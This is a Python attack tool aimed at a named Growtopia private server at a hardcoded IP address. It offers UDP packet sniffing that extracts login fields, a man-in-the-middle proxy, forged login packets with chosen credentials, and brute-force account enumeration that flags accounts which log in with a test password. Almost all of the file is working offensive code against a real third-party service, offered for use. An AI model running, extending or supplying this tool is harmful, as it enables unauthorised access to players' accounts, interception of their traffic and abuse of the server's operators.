#!/usr/bin/env python3
"""
Piter Server — GTPS Packet Sniffer & Forger
===========================================
Sniff ENet traffic between Growtopia client and Piter server (103.129.148.178:17091).
Runs on Mac/Linux. Requires Python 3.7+, no external deps.

USAGE:
  python3 piter_sniff.py sniff       # Sniff UDP 17091 traffic (run as root)
  python3 piter_sniff.py proxy       # MITM proxy: redirect GT → proxy → Piter
  python3 piter_sniff.py forge <GrowID> <password>  # Send forged login packet
  python3 piter_sniff.py brute <wordlist>  # Brute-force GrowID enumeration

For sniff/proxy modes: redirect GT client traffic via pf (Mac) or iptables (Linux).
"""

import socket
import struct
import sys
import time
import os
import signal
from datetime import datetime

PITER_IP = "103.129.148.178"
PITER_PORT = 17091

# ─── ENet Protocol Constants ───
ENET_PROTOCOL_MINIMUM_MTU = 576
ENET_PROTOCOL_MAXIMUM_MTU = 4096
ENET_PROTOCOL_MINIMUM_PACKET_SIZE = 4

# ENet packet flags
ENET_PACKET_FLAG_RELIABLE = 1 << 0
ENET_PACKET_FLAG_UNSEQUENCED = 1 << 1
ENET_PACKET_FLAG_NO_ALLOCATE = 1 << 2
ENET_PACKET_FLAG_UNRELIABLE_FRAGMENT = 1 << 3

# ENet protocol commands
ENET_PROTOCOL_COMMAND_NONE = 0
ENET_PROTOCOL_COMMAND_ACKNOWLEDGE = 1
ENET_PROTOCOL_COMMAND_CONNECT = 2
ENET_PROTOCOL_COMMAND_VERIFY_CONNECT = 3
ENET_PROTOCOL_COMMAND_DISCONNECT = 4
ENET_PROTOCOL_COMMAND_PING = 5
ENET_PROTOCOL_COMMAND_SEND_RELIABLE = 6
ENET_PROTOCOL_COMMAND_SEND_UNRELIABLE = 7
ENET_PROTOCOL_COMMAND_SEND_FRAGMENT = 8
ENET_PROTOCOL_COMMAND_SEND_UNSEQUENCED = 9
ENET_PROTOCOL_COMMAND_BANDWIDTH_LIMIT = 10
ENET_PROTOCOL_COMMAND_THROTTLE_CONFIGURE = 11
ENET_PROTOCOL_COMMAND_SEND_UNRELIABLE_FRAGMENT = 12

COMMAND_NAMES = {
    0: "NONE", 1: "ACK", 2: "CONNECT", 3: "VERIFY_CONNECT",
    4: "DISCONNECT", 5: "PING", 6: "SEND_RELIABLE", 7: "SEND_UNRELIABLE",
    8: "SEND_FRAGMENT", 9: "SEND_UNSEQUENCED", 10: "BANDWIDTH_LIMIT",
    11: "THROTTLE_CONFIGURE", 12: "SEND_UNRELIABLE_FRAGMENT"
}


def parse_enet_header(data):
    """Parse ENet protocol header. Returns dict or None."""
    if len(data) < 4:
        return None
    
    header = data[:4]
    
    # Check if this is a CONNECT (first 2 bytes: 0x00 0x00, next 2: channel count)
    # or VERIFY_CONNECT (0x00 0x00 0x00 0x00) followed by outgoingPeerID
    if header == b'\x01\x00\x00\x00':
        return {"type": "ENET_CONNECT", "raw": header.hex()}
    
    if header[0:2] == b'\x00\x00':
        return {"type": "ENET_VERIFY_OR_DATA", "raw": header.hex()}
    
    # Standard ENet header (peerID + flags)
    # Byte 0: peerID (low byte)
    # Byte 1-2: flags + sequence
    return {
        "type": "ENET_DATA",
        "peer_id": header[0],
        "flags": header[1],
        "raw": header.hex()
    }


def extract_tank_fields(data):
    """Try to extract tankIDName fields from packet data."""
    try:
        text = data.decode('utf-8', errors='replace')
        fields = {}
        for line in text.split('\n'):
            if '|' in line:
                key, _, val = line.partition('|')
                fields[key.strip()] = val.strip()
        return fields if fields else None
    except:
        return None


def sniff_mode():
    """Sniff UDP traffic to/from Piter server on port 17091."""
    print(f"[*] Sniffing UDP traffic on port {PITER_PORT}...")
    print(f"[*] Target: {PITER_IP}:{PITER_PORT}")
    print(f"[*] Press Ctrl+C to stop\n")
    
    # Create raw socket for UDP sniffing
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    except PermissionError:
        print("[!] Need root privileges for raw socket sniffing.")
        print("[!] Try: sudo python3 piter_sniff.py sniff")
        sys.exit(1)
    
    packet_count = 0
    start_time = time.time()
    
    try:
        while True:
            data, addr = sock.recvfrom(65535)
            if len(data) < 28:
                continue  # Min IP+UDP header
            
            # Parse IP header (20 bytes)
            ip_header = data[:20]
            protocol = ip_header[9]
            if protocol != 17:  # UDP
                continue
            
            src_ip = socket.inet_ntoa(ip_header[12:16])
            dst_ip = socket.inet_ntoa(ip_header[16:20])
            
            # Parse UDP header (8 bytes)
            udp_header = data[20:28]
            src_port = struct.unpack('!H', udp_header[0:2])[0]
            dst_port = struct.unpack('!H', udp_header[2:4])[0]
            
            # Filter: only port 17091 traffic
            if PITER_PORT not in (src_port, dst_port):
                continue
            
            # Extract payload
            payload = data[28:]
            if len(payload) == 0:
                continue
            
            packet_count += 1
            direction = "→" if dst_ip == PITER_IP else "←"
            timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            
            print(f"\n{'─'*60}")
            print(f"[{timestamp}] #{packet_count} {direction} {src_ip}:{src_port} → {dst_ip}:{dst_port} ({len(payload)}B)")
            print(f"  HEX: {payload[:64].hex()}{'...' if len(payload) > 64 else ''}")
            
            enet = parse_enet_header(payload)
            if enet:
                print(f"  ENet: {enet['type']}")
            
            tank = extract_tank_fields(payload)
            if tank:
                print(f"  TANK FIELDS:")
                for k, v in tank.items():
                    masked = v
                    if k.lower() in ('tankidpass', 'password', 'pass'):
                        masked = v[:2] + '*' * (len(v) - 2) if len(v) > 2 else '***'
                    print(f"    {k} = {masked}")
            
            # Also try to find hex string in printable range
            printable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in payload)
            if any(c.isalpha() for c in printable[:50]):
                print(f"  ASCII: {printable[:200]}")
    
    except KeyboardInterrupt:
        elapsed = time.time() - start_time
        print(f"\n\n[*] Stopped. Captured {packet_count} packets in {elapsed:.1f}s")
        sock.close()


def proxy_mode():
    """MITM proxy: intercept and forward UDP traffic."""
    print(f"[*] Starting UDP proxy on 0.0.0.0:{PITER_PORT}")
    print(f"[*] Forwarding to {PITER_IP}:{PITER_PORT}")
    print(f"[*] Redirect GT client DNS to this machine, then run this proxy")
    print(f"[*] Press Ctrl+C to stop\n")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind(('0.0.0.0', PITER_PORT))
    except PermissionError:
        print("[!] Need root to bind port 17091.")
        print("[!] Try: sudo python3 piter_sniff.py proxy")
        sys.exit(1)
    
    client_map = {}  # client_addr → last_seen
    packet_count = 0
    
    try:
        while True:
            data, addr = sock.recvfrom(65535)
            packet_count += 1
            timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            
            print(f"\n[{timestamp}] #{packet_count} {addr[0]}:{addr[1]} → Piter ({len(data)}B)")
            
            enet = parse_enet_header(data)
            if enet:
                print(f"  ENet: {enet['type']}")
            
            tank = extract_tank_fields(data)
            if tank:
                print(f"  TANK FIELDS:")
                for k, v in tank.items():
                    masked = v
                    if k.lower() in ('tankidpass', 'password', 'pass'):
                        masked = v[:2] + '*' * (len(v) - 2) if len(v) > 2 else '***'
                    print(f"    {k} = {masked}")
            
            printable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in data)
            if any(c.isalpha() for c in printable[:50]):
                print(f"  DATA: {printable[:300]}")
            
            # Forward to real Piter server
            sock.sendto(data, (PITER_IP, PITER_PORT))
            
            # Wait for response and forward back
            sock.settimeout(0.5)
            try:
                while True:
                    resp, _ = sock.recvfrom(65535)
                    if resp:
                        print(f"  ← Piter response: {len(resp)}B | {resp[:40].hex()}")
                        sock.sendto(resp, addr)
            except socket.timeout:
                pass
            finally:
                sock.settimeout(None)
    
    except KeyboardInterrupt:
        print(f"\n[*] Stopped. Proxied {packet_count} packets.")
        sock.close()


def forge_mode(grow_id, password):
    """Send forged ENet login packet directly to Piter server."""
    print(f"[*] Forging login packet for: {grow_id} / {password}")
    print(f"[*] Target: {PITER_IP}:{PITER_PORT}\n")
    
    ts = int(time.time())
    
    # Build tankIDName packet (pipe-delimited format)
    token_payload = f"_token={ts}&growId={grow_id}&password={password}&reg=0"
    
    tank_packet = (
        f"requestedName|{grow_id}\n"
        f"tankIDName|{grow_id}\n"
        f"tankIDPass|{password}\n"
        f"_{token_payload}"
    )
    
    print(f"  Packet content ({len(tank_packet)} chars):")
    print(f"  {tank_packet}")
    print()
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)
    
    # Try multiple packet header formats
    headers = {
        "RAW (no header)": b"",
        "ENet CONNECT": b'\x01\x00\x00\x00',
        "ENet VERIFY": b'\x00\x00\x00\x00',
        "ENet full": b'\x04\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\x7f\x00\x00\x00\x00',
    }
    
    for name, hdr in headers.items():
        data = hdr + tank_packet.encode()
        print(f"  [{name}] Sending {len(data)} bytes...")
        
        try:
            sock.sendto(data, (PITER_IP, PITER_PORT))
            try:
                resp, addr = sock.recvfrom(4096)
                print(f"    ← RESPONSE: {len(resp)}B from {addr}")
                print(f"    HEX: {resp[:64].hex()}")
                
                tank_resp = extract_tank_fields(resp)
                if tank_resp:
                    print(f"    FIELDS: {tank_resp}")
                    
                printable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in resp)
                if any(c.isalpha() for c in printable[:30]):
                    print(f"    ASCII: {printable[:200]}")
            except socket.timeout:
                print(f"    ← No response (timeout)")
        except Exception as e:
            print(f"    [!] Error: {e}")
        
        print()
        time.sleep(0.5)
    
    sock.close()
    print("[*] Done.")


def brute_mode(wordlist_path):
    """Brute-force GrowID enumeration against Piter server."""
    if not os.path.exists(wordlist_path):
        print(f"[!] Wordlist not found: {wordlist_path}")
        sys.exit(1)
    
    print(f"[*] Brute-forcing GrowID against {PITER_IP}:{PITER_PORT}")
    print(f"[*] Wordlist: {wordlist_path}")
    print(f"[*] Error discriminator: 'invalid credentials' = EXISTS, 'account not found' = NOT EXISTS\n")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    
    found = []
    tested = 0
    
    with open(wordlist_path) as f:
        for line in f:
            grow_id = line.strip()
            if not grow_id or grow_id.startswith('#'):
                continue
            
            tested += 1
            
            ts = int(time.time())
            tank_packet = (
                f"requestedName|{grow_id}\n"
                f"tankIDName|{grow_id}\n"
                f"tankIDPass|brute_test\n"
                f"_token={ts}&growId={grow_id}&password=brute_test&reg=0"
            )
            
            data = b'\x04\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\x7f\x00\x00\x00\x00' + tank_packet.encode()
            
            try:
                sock.sendto(data, (PITER_IP, PITER_PORT))
                resp, _ = sock.recvfrom(4096)
                
                resp_text = resp.decode('utf-8', errors='replace').lower()
                
                if 'invalid' in resp_text or 'wrong' in resp_text:
                    # Account EXISTS - wrong password
                    print(f"  [+] #{tested} FOUND: {grow_id} (invalid credentials → akun ADA)")
                    found.append(grow_id)
                elif 'not found' in resp_text or 'doesn\'t exist' in resp_text:
                    pass  # Not found
                elif 'success' in resp_text or 'welcome' in resp_text:
                    print(f"  [!!!] #{tested} JACKPOT: {grow_id} LOGGED IN! (password: brute_test)")
                    found.append(f"{grow_id} (LOGGED IN!)")
                else:
                    print(f"  [?] #{tested} {grow_id}: {resp_text[:80]}")
                    
            except socket.timeout:
                pass  # No response
            except Exception as e:
                print(f"  [!] #{tested} {grow_id}: Error: {e}")
            
            time.sleep(0.1)  # Rate limit
    
    sock.close()
    
    print(f"\n[*] Tested {tested} GrowIDs")
    print(f"[*] Found {len(found)} existing accounts:")
    for f in found:
        print(f"    {f}")


def usage():
    print(__doc__)
    print("EXAMPLES:")
    print("  sudo python3 piter_sniff.py sniff")
    print("  sudo python3 piter_sniff.py proxy")
    print("  python3 piter_sniff.py forge piterp password123")
    print("  python3 piter_sniff.py forge admin test")
    print("  python3 piter_sniff.py brute /tmp/growids.txt")
    sys.exit(1)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        usage()
    
    mode = sys.argv[1]
    
    if mode == "sniff":
        sniff_mode()
    elif mode == "proxy":
        proxy_mode()
    elif mode == "forge":
        if len(sys.argv) < 4:
            print("[!] Usage: piter_sniff.py forge <GrowID> <password>")
            sys.exit(1)
        forge_mode(sys.argv[2], sys.argv[3])
    elif mode == "brute":
        if len(sys.argv) < 3:
            print("[!] Usage: piter_sniff.py brute <wordlist.txt>")
            sys.exit(1)
        brute_mode(sys.argv[2])
    else:
        usage()
